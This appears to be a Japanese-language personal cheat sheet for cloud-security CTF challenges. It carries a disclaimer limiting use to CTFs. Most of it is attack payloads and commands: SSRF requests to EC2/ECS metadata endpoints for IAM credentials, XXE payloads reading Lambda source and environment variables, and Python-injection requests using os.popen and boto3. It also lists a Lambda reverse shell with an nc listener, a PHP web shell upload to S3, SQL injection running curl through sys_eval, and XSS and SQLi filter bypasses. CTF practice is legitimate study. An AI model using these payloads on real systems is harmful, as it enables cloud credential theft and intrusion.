# メモ
- CTFのための個人的なメモ、整理移動後に削除予定
- CTF用途のみでの利用を厳守。悪用厳禁。公開環境に攻撃することは犯罪になります。

## EC2

### SSRF
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#ssrf-url-for-cloud-instances
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#bypass-localhost-with-
- EC2のメタデータにアクセス
    - IPv4
        - http://169.254.169.254/latest/meta-data/
    - IPv6
        - http://\[fd00:ec2::254\]/latest/meta-data/

### エンドポイント例
- http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role
- http://\<ip-address\>/request?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2_role
- curl http://\<ip-address\>/request?url=http://169.254.169.254/latest/user-data
- http://169.254.169.254/latest/dynamic/instance-identity/document #リージョン情報、アカウントID
- http://169.254.169.254/latest//meta-data/ #メタデータ
- http://169.254.169.254/latest//meta-data/iam/security-credentials/ #クレデンシャルの一覧
- 

### よそへ飛ぶ
- http://\<ip-address\>/request?url=http://google.com

### WAf回避
- ELBは先頭8KBをチェック
    - curl -X POST http://\<endpoint\>/login.php/ -d "test=aaaaa...aa&username=user123&password=1'or'1'='1';--"-v

### シンプルに取れないパターン
- IMDSv2のトークンをリクエストに付与しないといけないパターン
    - curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
    - curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/ #これでメタデータ
    - curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role　#これで認証情報
- httpsしか使ってはダメとフロント制限があるパターン
    - DevTools で直接patternを消してしまう
        -  \< ... pattern="https://.+"\> #ここ
 - ブラックリストで169.254.269.254が封じられているパターン
     - Ipv6
     - 短縮URL
     - 8進数


## S3
- http://*.s3.amazonaws.com/を開いてみてディレクトリリスティングされたら脆弱
- ドメイン名　＝　バケット名
    - nslookupなどでサービス特定
    - ドメイン名、s3リージョンを使ってバケットのURLを特定
- エンドポイント
    - 仮想ホスト形式
        - http://\<bucket-name\>.s3.amazonaws.com
        - http://\<bucket-name\>.s3-\<region\>.amazonaws.com
    - path形式
        - http://s3.amazonaws.com/\<bucket-name\>
        - http://s3-<region>.amazonaws.com/\<bucket-name\>
- バージョニング
    - aws s3api list-object-versions --bucket \<bucket-name\> --profile \<prifile\> 過去バージョン列挙
    - aws s3api get-object --bucket \<bucket-name\>  --key \<↑で拾ったやつ> --version-id \<↑で拾ったやつ\> --profile \<profile\>
--
version id MO4Xz6sB8DONDjCid6ideiRgfdyywcSv profile finddata3
### アップロード
 - PHPを挙げてウェブシェルにする
### バケットネームがわかる
- http://s3.amazonaws.com/\<bucket-name\> でとりあえずアクセス
    - 見れたらOK
    - packageというファイルがあれば、http://s3.amazonaws.com/\<bucket-name\>/packageって感じでDL可能
    -GETが許可されていなくても　curl -X PUT \<URL> でOK
- バケットネームわからんくても応答ヘッダに入ってるかも

## ECS
- ECSのメタデータにアクセス
    - http://169.254.179.2/v2/metadata
    - http://169.254.170.2/v2/credentials/\<random-uuid\>
- ECSに付与されたIAMロールのクレデンシャル
    - 環境変数の ECS_CONTAINER_METADATA_URI を探す
    - .bashrcに入ってる
    - ファイルにメタデータパスを埋め込んでウェブサービスにアップロード
      - \<body>\<iframe src="http://169.254.170.2/v2/metadata" width="500" height="1000"\>

## Lambda
- クレデンシャルは環境変数
    - AWS_SESSION_TOKEN
    - AWS_SECRET_ACCESS_KEY
    - AWS_ACCESS_KEY_ID
### XXE
- XMLでソースコードを開示させる
    - \<!DOCTYPE loadthis \[\<"ELEMENT loadthis ANY\>
    - \<!ENTITY somefile SYSTEM "file:////var/task/handler.py">]>
    - \<loadthis>\&somefile;\</loadthis\>
- XMLで環境変数を見る
    - /proc/self/environ
- Lambda リバースシェル
    - 関数をcliで調べる
    - wget http://<問題サーバー>/2015-03-31/functions/billing/code -O code.zip
    - aws lambda update-function-code でリバースシェルを上げて動かす
    - nc- nlvp \<port-num>
### SSRF
- \<?xml version="1.0" encoding="UTF-8"?>
- \<!DOCTYPE stockCheck
- \[ \<!ENTITY foo SYSTEM "http://169.254.169.254/latest/meta-data/""\> \]\>
- \<stockCheck\>\<productId\>\&foo;\</productId\>\<storeId\>1\</storeId\>
- \</stockCheck\>
### バージョニング
- aws lambda list-versions-by-function --function-name db-backup --profile \<profile\>


### OS command injection
- JSONでデータを入れるとさばいてくれるAPIに対して
    - {"input":"__import__('os').popen('ls').read()"}
    - {"input":"__import__('os').popen('cat さっき見つけたファイル').read()"}
    - {"input":"__import__('os').popen('env').read()"} #IAMとる
    - curl -s -X POST -H "Content-Type: application/json" -d "{\"input\":\"[item['Key'] for item in __import__('boto3').client('s3').list_objects(Bucket='nullcon-s3bucket-flag4')['Contents']]\"}" http://\<ip-address\>/calc
    - curl -s -X POST -H "Content-Type: application/json" -d "{\"input\":\"__import__('boto3').client('s3').get_object(Bucket='nullcon-s3bucket-flag4',Key='↑の結果')['Body'].read()\"}" http://\<ip-address\>/calc

## IAM
- AKIA~ から始まる文字列はアクセスキー
    - javascriptに埋め込んであったり
- 探索の流れ
    - 登録
        - aws configure (--profile hoge)
    - アクセスキーに紐づくユーザー名確認
        - aws sts get-caller-identity --profile hoge
    - アタッチされてるポリシー
        - aws iam list-attached-user-policies --user-name hoge --profile hoge
    - カスタム管理ポリシーのバージョン確認
        - aws iam get-policy --policy-arn arn::hogehoge --profile hoge
    - 指定バージョンのカスタム管理ポリシー確認
        - aws iam get-policy-version --policy-arn arn:hogehoge --version-id v2とか --profile hoge
    - グループ名確認
        - aws iam list-groups-for-user --user-name hoge
    - グループにアタッチされているインラインポリシー
        - aws iam ge-group-policy --group-name hoge --policy-name hoge --query 'PolicyDocument' --profile hoge
    - ロール列挙
        - aws iam list-roles
        - Actionにsts:AssumeRole, Principalに＊があるものがあると嬉しい
        - それを使うか、それを使えるIAMロールを作る
        - https://scgajge12.hatenablog.com/entry/ctf_cloud_2022
            - aws iam create-role --role-name hoge --assume-role-policy-document file://hoge.json
        - STSから一時クレデンシャル発行
            - aws sts assume-role --role-arn arn:hoge --role-session-name hoge
        - クレデンシャルをセットして使う


### ロールをCLIで使うとき
- aws_access_key_id、aws_secret_access_key、aws_session_tokenの3つを要設定
- aws config で設定するリージョンは同一にすること
- aws sts get-caller-identity --profile ec2_role

## RDS
- passしかなくても、MySQLダイレクト接続できるかも
- x'; SELECT sys_eval('curl http://169.254.169.254/latest/meta-data/'); -- //
- x'; SELECT http_get('http://169.254.169.254/latest/meta-data/'); -- //

## aws command
- aws configure #もろもろを設定、最後のformatは入力不要
- aws s3 ls
- aws s3 ls \<backetname\>
- aws s3 ls --endpoint-url http://s3.bucket.hoge
- aws s3 ls ↑の応答 --endpoint-url http://s3.bucket.htb
- aws s3 cp \<s3:\\\\file_path\> \<localpath\>
- aws s3api get-object --bucket \<bucket-name\> #バケットのオブジェクト取得
- aws s3api list-object-versions --bucket \<bucket-name\>
- aws ec2 describe-tags
- aws lambda list-functions
- aws lambda list-tags --resource \<function-arn\>
- aws lambda list-functions --endpoint-url http://<問題サーバー> --output json
- aws lambda invoke function name \<関数名\> out profile runfunction
- aws lambda invoke function name \<関数名\> out log type Tail query ' LogResult '　#ログ付き
--
output text profile runfunction | base64 d
- aws lambda get-function --endpoint-url http://<問題サーバー> --output json  --function-name <関数名>
- aws secretsmanager get-secret-value --secret-id database_pw
- aws sts get-caller-identity #アカウント情報
- aws sts get-caller-identity --profile=flag
- aws dynamodb scan --table-name private-ctfdb --profile ec2_role
- 
### ほか
- 使っているAWSサービスを調べる
    - nslookup \<website-url\>
    - nslookup \<ip-address\> #上で初めに列挙されたやつをいれる
- dev toolを使う
    - キャプチャして叩かれているAPIを覗く
- \<標的IP\>/.git
    - gittools 等で落としてきてコミットログを漁る
    - クレデンシャルが空欄だと、コミットで消してるかも
- echo 'hogehogehoge' | base64 -d  
- mysql
    - show databases;
    - use \<database-name\>; #usersとかあると嬉しい
    - show tables;
    - select * from \<table-name\>;
- nginxの設定ファイル
    - location /hoge 「ここ」終端スラッシュがないと..でパストラバーサル可
        - http://\<domain\>/assets../secret/.htpasswd
    - location /admin/ とかあったら覗きたいところ
        - admin/proxy/メタデータサービスのURL
        - admin/proxy/メタデータ/iam/security-credentials/ロール名
    - https://qiita.com/no1zy_sec/items/2718f4a99bb8368ac374
- 見るとこ
    - URL
    - ソース
    - Cookie
    - SQL, XSS, path, 
      - admin'-- 
      - 'OR1=1--
# XSS
- \<script>alert('XSS')\</script>
- \<img src="XSS" onerror="alert('XSS')">
- \'>\<script>alert()\</script>`
- \`3')||alert('a
- http://www.google.com/jsapi?callback=alert

# sqli
- 'OR'1'='1
- ' union select 'admin' #
- ?id=admin%27%23　こんな風にURLエンコすること
- クオート禁止→ hex
    - ?no=1' or id='admin'#　もと
    - ?no=0+or+id=0x61646d696e　hex
- adminが消される：adadminmin
- or, and禁止：||, &&
- admin禁止：ADMIN
- =禁止：like, not in, in, between
- substr禁止：mid
- sqliteなら -- か /* でコメント、｜｜はORではなく結合
    - 'ad'||'min'
- コメント一式が封じらえているとき
    - ; で終わらせる
    - order by や group by で終らせておく
